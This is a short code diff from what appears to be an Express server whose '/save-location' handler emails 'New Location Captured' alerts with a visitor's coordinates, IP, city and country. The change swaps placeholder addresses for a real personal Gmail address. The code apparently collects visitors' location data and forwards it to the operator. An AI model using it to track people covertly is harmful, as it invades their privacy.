@@ -30,8 +30,8 @@ app.post("/save-location", (req, res) => {
 
     // Send email alert
     const mailOptions = {
-        from: "YOUR_EMAIL@gmail.com",
-        to: "YOUR_EMAIL@gmail.com",
+        from: "sumitprasad035@gmail.com",
+        to: "sumitprasad035@gmail.com",
         subject: "New Location Captured",
         text: `Location: ${newData.latitude}, ${newData.longitude}\nIP: ${newData.ip}\nCity: ${newData.city}, ${newData.country}`
     };
